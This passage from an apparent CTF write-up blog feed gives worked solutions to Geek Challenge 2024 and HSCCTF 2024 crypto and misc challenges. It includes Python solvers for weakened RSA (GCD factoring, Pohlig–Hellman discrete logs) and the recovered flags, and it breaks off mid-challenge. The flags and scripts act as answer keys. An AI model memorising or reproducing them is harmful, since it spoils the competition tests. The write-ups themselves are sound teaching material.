class="string">&#x27;BLkGdjr2BqO1Sjd0R0DWd0gHBjg3BmrGR0BFd0lzBFh1Sqr3RLVWBJI1BqtLejy0dJlVBLl0BqIWS016dWh1B0k2dmh0dqI1dj15SWdydjyzdqx3Sjd0Sqr5dJgGRLDyd0t5ejSWejlWRFlzRL1LejIWBjD0eqV1Smg6R0IVS0dVdjC5dJIzeJSVdmlyBLdVBWIWR0I0SqVyS0u1eqhWRFr5dFk3dWkGdjVzBjBFdjtHRLNUS0RGemrFdJR4SjN4d0C2ejOVSmk6d0yyS0NLBqhWdFBFeqVVRFkFBJrUdqIzRjx5BqD1SqD1BWIWBmr2djgUemIWSqr4RFRUSmIy&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">a_output=<span class="string">&#x27;RLC6eJIWBLOVdj14ejyWBjx6BqkUSjCUSqg2d0d0BLhydLIzdmhzejy1BJg3BLxLBqk5BqO0SjRHRFhydLOWd0xUdLR4dWS1eJgUBLdzdjrFBLdVd0d0d0dzSjkURFBLdqk2Sjy1Bqh1B0xGSmhyBLkLdmR6BmrHRL12ejSWemk3R0R6Smh0eqIVR01GBmg3dmNUSmd0B0DzdJgFd0t5dLCUSjtLRmR5BjD1BmOVS012BjdVejtHd0CLBWg6d0yWSqu1B0gLSqC5RFdzSJOVR0CGdjuVdmr3RmSWRWBUdLSVeqdWeqlzSJkFeqkFBjy1dj16SWk6BFgGdjgUBjVyBx==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br></pre></td></tr></table></figure><p>分析程序，base64变表为 <code>CDEqrIJKNOPABdefghijklmQRSTstuvwxyz01VWXYZabcnop456L23FGHUM789+/</code>。</p><p>分别解码得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">c_output=<span class="string">&#x27;639cd472630afb1aa9f5490b4f3de3b4701eef5c61aad06345f9e001021340cf989fc082693f745716bd39d015793e62be08913dcb82b2b6c8ed56d15a4cc230a60ea185d593a858b47276c403c79b6da23b561b200295a8addba7a48660d17a9eef322e430b939aecc4ca0c0f4fcc003524cdca68b7be935962f4b4ad8cafd5&#x27;</span></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">n1_output=<span class="string">&#x27;11df715605906c9cfc906faf4d02a380b9489fe890952cfbc7713af87031b61a4a3a0e2c46ba89ef462a3a77def7d5de0a0a10b3d1303afc06ed7bc9f07e01e9883b06ce17c290fe550844cf9028f50642e4190ccb13cdf0bb0493e437c54ee17643202cc1b35741208957eb6c1843299b4480e6d32a311de6fd6f4b9d9e8fab&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">c1_output=<span class="string">&#x27;5a768e8e3e4efe51f566d77dd9a1312f5398bc9e1fa4e828be6a3b6aa6109de02c4eec524e23bf0836b7b25f534a429744e980bdc3acd77a8133c543ea1cf4f4665fbd46bc21d38edd60a687007e079980cac97e1099610aeceee3bff13483396a4cfb061df7d5bce9c7fba6ae14fbead5f56aa990f23ee9cbe8a8fc066d5fa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint1_output=<span class="string">&#x27;c3fd84beeb2363d414848fda5898976625bcbb9637982f83853a6c96e64c8ec94645409b7036e3b187ecf930e294fc448c4ac6bfa9945078300b1619bc98d13275770f562874c7fd389ba9ef4e05019633566e65ba95e5a30e29a45b79774c6aaed89aa43105508e868941c81861120f50fe182e33b80701e1714205759f380&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">n2_output=<span class="string">&#x27;3cc006e0dea07f834418109ac8c1a447258c7da01223107fd255303613ce9ffc3faa74823a28ea1e211a34c349f20b49bb00447777e4d7f5139219e62fb993562f7e705e0919ccbc414956e8a6cc3e01812ca6eb10558060fe0f7c06da63e5d6169ea5790e86f3e2e804d399d1429529d3031738f134e619a0decce12bde4cd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">c2_output=<span class="string">&#x27;2de5d5191bf279ba3ea338bd4390a18d0233da9e050b3aa2644a9427eff787b4d74aa3c7dc348f214247997ae32fb86428935e61234f9ef63e9b562c40b6b07c9133cad4672c9aa7f515d3f7d067b6187d30e4346c4afeceae031c3116ccf97acaddb2af42d459c61ce0df7b56ce1e0ba15cf28aed5415615aa9398fb494e5b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint2_output=<span class="string">&#x27;2dd30b086f1c8fa7860ed5cde1e02a062e8722ae9823579f764d5da86ec250b2dfee6934463a06b133d791c3cfbe5f88a43bfae7f25cfb3efb61c10aa710aa76e2229241986fb16f1ae34a867cb7ba641d5637b70a92027479e9c18d1372059a4e04a7298c5b279fa6d84abc1b466b29bba8a1a2ea9e8ad568c14af17c4f50e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint3_output=<span class="string">&#x27;35751402de3cb0f6481451a7b3665b3ddd15c9f0ad07398c4ee35c01ff926dd2545dc41d591fca58b485e3cd114d7c0a67196f95fcebc9391f10c89ded2b1ef3e5014ab8fe5ea33e2afb1cd9af7d84fca17e56e759b136578c29f679a64f0e2060492eee268af2304f7c689ece60a941ba8100dd0d2af1a45499afd10cf9eaa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">a_output=<span class="string">&#x27;c028af32e59098f182059e09d4463c34a71b5db98d0d538305102ce68cda72f6897606fd8d933b51633e63c63be59cc3454e8d04d287eda3535f21a8c9496f9e5b62edc81eb971d55b9ecc20b4d6671709e73af110d1bef9413e9786032d268fd7d243d01ccbdbeb0757e5a5affbc976e83f85bde685618d592fe23d754919a2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br></pre></td></tr></table></figure><p>分析计算部分的逻辑为：</p><p>$c_1 = p^{e_1} \pmod {n_1}$</p><p>$h_1 = 2023p_1+2024 \pmod {q_1}$</p><p>$c_2 = q^{e_2} \pmod {n_2}$</p><p>$h_2 = (2023p_2+2024q_2)^{2323} \pmod {n_2}$</p><p>$h_3 = (2024p_2+2023q_2)^{2424} \pmod {n_2}$</p><p>$a = g^e \pmod n$</p><p>同题 Number theory，数论+DLP（Pohlig–Hellman）求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">babystep_giantstep</span>(<span class="params">g, y, p, q=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> q <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        q = p - <span class="number">1</span></span><br><span class="line">    m = <span class="built_in">int</span>(q**<span class="number">0.5</span> + <span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># Baby step</span></span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    gr = <span class="number">1</span>  <span class="comment"># g^r</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        table[gr] = r</span><br><span class="line">        gr = (gr * g) % p</span><br><span class="line">    <span class="comment"># Giant step</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        gm = <span class="built_in">pow</span>(g, -m, p)  <span class="comment"># gm = g^&#123;-m&#125;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    ygqm = y                <span class="comment"># ygqm = y * g^&#123;-qm&#125;</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> ygqm <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">return</span> q * m + table[ygqm]</span><br><span class="line">        ygqm = (ygqm * gm) % p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pohlig–Hellman法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pohlig_hellman_DLP</span>(<span class="params">g, y, p</span>):</span><br><span class="line">    crt_moduli = []</span><br><span class="line">    crt_remain = []</span><br><span class="line">    <span class="keyword">for</span> q, _ <span class="keyword">in</span> factor(p-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> q &lt; <span class="number">10</span>^<span class="number">7</span>:</span><br><span class="line">            x = babystep_giantstep(<span class="built_in">pow</span>(g,(p-<span class="number">1</span>)//q,p), <span class="built_in">pow</span>(y,(p-<span class="number">1</span>)//q,p), p, q)</span><br><span class="line">            <span class="keyword">if</span> (x <span class="keyword">is</span> <span class="literal">None</span>) <span class="keyword">or</span> (x &lt;= <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crt_moduli.append(q)</span><br><span class="line">            crt_remain.append(x)</span><br><span class="line">    x = crt(crt_remain, crt_moduli)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">c = <span class="number">0x639cd472630afb1aa9f5490b4f3de3b4701eef5c61aad06345f9e001021340cf989fc082693f745716bd39d015793e62be08913dcb82b2b6c8ed56d15a4cc230a60ea185d593a858b47276c403c79b6da23b561b200295a8addba7a48660d17a9eef322e430b939aecc4ca0c0f4fcc003524cdca68b7be935962f4b4ad8cafd5</span></span><br><span class="line">n1 = <span class="number">0x11df715605906c9cfc906faf4d02a380b9489fe890952cfbc7713af87031b61a4a3a0e2c46ba89ef462a3a77def7d5de0a0a10b3d1303afc06ed7bc9f07e01e9883b06ce17c290fe550844cf9028f50642e4190ccb13cdf0bb0493e437c54ee17643202cc1b35741208957eb6c1843299b4480e6d32a311de6fd6f4b9d9e8fab</span></span><br><span class="line">c1 = <span class="number">0x5a768e8e3e4efe51f566d77dd9a1312f5398bc9e1fa4e828be6a3b6aa6109de02c4eec524e23bf0836b7b25f534a429744e980bdc3acd77a8133c543ea1cf4f4665fbd46bc21d38edd60a687007e079980cac97e1099610aeceee3bff13483396a4cfb061df7d5bce9c7fba6ae14fbead5f56aa990f23ee9cbe8a8fc066d5fa</span></span><br><span class="line">e1 = <span class="number">39847</span></span><br><span class="line">h1 = <span class="number">0xc3fd84beeb2363d414848fda5898976625bcbb9637982f83853a6c96e64c8ec94645409b7036e3b187ecf930e294fc448c4ac6bfa9945078300b1619bc98d13275770f562874c7fd389ba9ef4e05019633566e65ba95e5a30e29a45b79774c6aaed89aa43105508e868941c81861120f50fe182e33b80701e1714205759f380</span></span><br><span class="line">n2 = <span class="number">0x3cc006e0dea07f834418109ac8c1a447258c7da01223107fd255303613ce9ffc3faa74823a28ea1e211a34c349f20b49bb00447777e4d7f5139219e62fb993562f7e705e0919ccbc414956e8a6cc3e01812ca6eb10558060fe0f7c06da63e5d6169ea5790e86f3e2e804d399d1429529d3031738f134e619a0decce12bde4cd</span></span><br><span class="line">c2 = <span class="number">0x2de5d5191bf279ba3ea338bd4390a18d0233da9e050b3aa2644a9427eff787b4d74aa3c7dc348f214247997ae32fb86428935e61234f9ef63e9b562c40b6b07c9133cad4672c9aa7f515d3f7d067b6187d30e4346c4afeceae031c3116ccf97acaddb2af42d459c61ce0df7b56ce1e0ba15cf28aed5415615aa9398fb494e5b</span></span><br><span class="line">e2 = <span class="number">44021</span></span><br><span class="line">h2 = <span class="number">0x2dd30b086f1c8fa7860ed5cde1e02a062e8722ae9823579f764d5da86ec250b2dfee6934463a06b133d791c3cfbe5f88a43bfae7f25cfb3efb61c10aa710aa76e2229241986fb16f1ae34a867cb7ba641d5637b70a92027479e9c18d1372059a4e04a7298c5b279fa6d84abc1b466b29bba8a1a2ea9e8ad568c14af17c4f50e</span></span><br><span class="line">h3 = <span class="number">0x35751402de3cb0f6481451a7b3665b3ddd15c9f0ad07398c4ee35c01ff926dd2545dc41d591fca58b485e3cd114d7c0a67196f95fcebc9391f10c89ded2b1ef3e5014ab8fe5ea33e2afb1cd9af7d84fca17e56e759b136578c29f679a64f0e2060492eee268af2304f7c689ece60a941ba8100dd0d2af1a45499afd10cf9eaa</span></span><br><span class="line"></span><br><span class="line">p1 = GCD(n1, <span class="built_in">pow</span>(<span class="number">2024</span>,n1,n1)-h1)</span><br><span class="line">q1 = n1 // p1</span><br><span class="line">f1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d1 = inverse(e1,f1)</span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">pow</span>(c1,d1,n1))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">A1 = <span class="number">2023</span></span><br><span class="line">B1 = <span class="number">2024</span></span><br><span class="line">A2 = <span class="number">2024</span></span><br><span class="line">B2 = <span class="number">2023</span></span><br><span class="line">ea = <span class="number">2323</span></span><br><span class="line">eb = <span class="number">2424</span></span><br><span class="line">t1 = <span class="built_in">pow</span>(A1, ea*eb, n2)</span><br><span class="line">t2 = <span class="built_in">pow</span>(A2, ea*eb, n2)</span><br><span class="line">temp1 = t2 * <span class="built_in">pow</span>(h2, eb, n2)</span><br><span class="line">temp2 = t1 * <span class="built_in">pow</span>(h3, ea, n2)</span><br><span class="line"></span><br><span class="line">p2 = GCD(temp1-temp2, n2)</span><br><span class="line">q2 = n2 // p2</span><br><span class="line">f2 = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2 = inverse(e2,f2)</span><br><span class="line">q = <span class="built_in">int</span>(<span class="built_in">pow</span>(c2,d2,n2))</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line">a = <span class="number">0xc028af32e59098f182059e09d4463c34a71b5db98d0d538305102ce68cda72f6897606fd8d933b51633e63c63be59cc3454e8d04d287eda3535f21a8c9496f9e5b62edc81eb971d55b9ecc20b4d6671709e73af110d1bef9413e9786032d268fd7d243d01ccbdbeb0757e5a5affbc976e83f85bde685618d592fe23d754919a2</span></span><br><span class="line">g = <span class="number">0x488d156b0cbef000f1bf6c47006a3595</span></span><br><span class="line">n = <span class="number">0x9c5ab7c1cc9a4f60b1d53afafd7016d00e811e5a1c6fb258c75a246a0630a75644100828e21757de1d9a5ff99ebd05257aa9d895c1de40a2eb619fa52f32b38acb52669841d528351df863137b0a14f4aff6506cf0c7cdf1801c2bd3d7fb4e583811f4f771f7e5c0e5f42a85839affed38df8b913fa6a4e782adc028e5e86162f</span></span><br><span class="line">e = pohlig_hellman_DLP(g, a, n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(g,e,n) == a</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;IKnowYouLikeReverseAndCrypto&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;三叶草安全技术小组第十五届极客大挑战&lt;/p&gt;
&lt;p&gt;极客大挑战是由三叶草安全技术小组自发组织举办的一场全国性网络安全赛事，目前，极客大挑战已成功举办十四届，吸引了超两万五千人次参加，累计提供超1000道赛题，广受全国各地参赛人员好评。作为国内最早一</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2024赛" scheme="https://lazzzaro.github.io/tags/2024%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HSCCTF 2024</title>
    <link href="https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/"/>
    <id>https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/</id>
    <published>2024-03-11T03:28:02.000Z</published>
    <updated>2024-03-14T12:47:15.999Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>本届HSCCTF 2024是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖WEB、CRYPTO、MISC、PWN、REVERSE、OSINT等主流方向，并面向全球开放。</p><p><strong>Rank: 1</strong></p><hr><p>​    </p><h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><h3 id="CHECKIN-1"><a href="#CHECKIN-1" class="headerlink" title="CHECKIN"></a>CHECKIN</h3><blockquote><p>关注公众号：#红客突击队/#中龙红客突击队，并发送hscctf2024以获取flag</p></blockquote><p>分别给两个公众号发hscctf2024，得到字符串拼接：<code>hscctf&#123;hscctf2O24_w3lc0me&#125;</code>。</p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="катюша"><a href="#катюша" class="headerlink" title="катюша"></a>катюша</h3><blockquote><p>flag形式为:HSCCTF{this_is_an_example}</p></blockquote><p>查看源码，提取rgb值拼接：</p><p><code>4, 8, 5, 3, 4, 3, 4, 3, 5, 4, 4, 6, 7, 11, 5, 9, 6, 15, 7, 5, 5, 15, 6, 8, 6, 1, 7, 6, 6, 5, 5, 15, 7, 2, 6, 5, 6, 3, 6, 5, 6, 9, 7, 6, 6, 5, 6, 4, 5, 15, 7, 4, 6, 8, 6, 5, 5, 15, 6, 12, 6, 5, 7, 4, 7, 4, 6, 5, 7, 2, 5, 15, 6, 15, 6, 6, 5, 15, 4, 11, 6, 1, 7, 1, 6, 9, 7, 5, 7, 3, 6, 8, 6, 1, 7, 13</code></p><p>转换为16进制：</p><p><code>4853434354467b596f755f686176655f72656365697665645f7468655f6c65747465725f6f665f4b617169757368617d</code></p><p>转为字符串：<code>HSCCTF&#123;You_have_received_the_letter_of_Kaqiusha&#125;</code></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="FUNNY"><a href="#FUNNY" class="headerlink" title="FUNNY"></a>FUNNY</h3><blockquote><p>出题人很幽默,给你p和q了直接解吧</p></blockquote><p>直接运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">1627858721743596752497831640628357323459243890844363792736407789751577427319257708507686114456632938183775129585728892845205290864750578798354859933996208521450129131173352490118085939969385911306718129785035108056909135931322755908602656567223998858450130768625587559935064753603718657989533793373124922891077849376447589198239126291127263234784363556777780461489387706699053671315621968807065360907667815336609878856798387057891974730460404647229308105442629038061284060276648993434681114539955086828451085582033288860959729755856478065093327544217813990665326820156340461326538271909605715822484950196033809892232121330623027855970475888202583512234213349462680452400729903400494519431590431864717223438807093669836615356855072370571595889807712166659061190031457954071146645411277702230847389264989391715763232453605404095019402186331633202953693057641475300619482863265936513394341066776619336452923951439714749067348507</span></span><br><span class="line">q = <span class="number">165059760196977338034268528857897083190717585647808271832795575354736221674892279730906525407442580833042731114617534865267230347093979480666213073939602212663043286794259410177026619955285626139270678815060566416554620185859901611571955490060241822054715533030464833509114500388615748465579240918292431860839</span></span><br><span class="line">c = <span class="number">209347444484196477254668267578954904181293909211985372842733666165076889646025992007884927283300662833989678431462547742385291078285045060028956748455410812196305788814280968487973559115983082461315009316488143477261307107939530267533197821947240438534411830018967506368459544025037634267899970815198992392565948727381322854560823769432552779881938316107779842525092269591932257206582810678457433166038809740255591841951300818106018061065936083887559841543250701094558114335651396741896281230175124133873529005816838785880680073159461666783649744640398010841282229366323100807220116460976549981263966530038289223576133865992894885483308732021144420507955669760623032114718333853671281281221009397028372653797668774820725717817362383394165014402977767667433542733963298092312930702496796235196487999167666133884266829605503363510544384236303968829214389757297563873395131798724306227675722494797069994655456021649231626359765579028950908065367760981736933167557841586896807116262630848742514005606289980676609588756946993271763119859088002784499062149533167332388600036550273743940503131248513795389688869470432261503038708892320267815658450917855334244502333938120781251564676408212996623419957317150267768978807968208353379334556945</span></span><br><span class="line"></span><br><span class="line">d = inverse(<span class="number">65537</span>, q - <span class="number">1</span>)</span><br><span class="line">m = powmod(c, d, q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#HSCCTF&#123;xin_nian_hao_ya&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="REAL-SIGN-IN"><a href="#REAL-SIGN-IN" class="headerlink" title="REAL_SIGN_IN"></a>REAL_SIGN_IN</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;*************************&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    c = powmod(m, e, n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n&quot;</span>, i, <span class="string">&quot;=&quot;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c&quot;</span>, i, <span class="string">&quot;=&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813</span></span><br><span class="line"><span class="string">c1 = 10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971</span></span><br><span class="line"><span class="string">n2 = 13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909</span></span><br><span class="line"><span class="string">c2 = 3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076</span></span><br><span class="line"><span class="string">n3 = 20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453</span></span><br><span class="line"><span class="string">c3 = 11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315</span></span><br><span class="line"><span class="string">n4 = 19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889</span></span><br><span class="line"><span class="string">c4 = 12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720</span></span><br><span class="line"><span class="string">n5 = 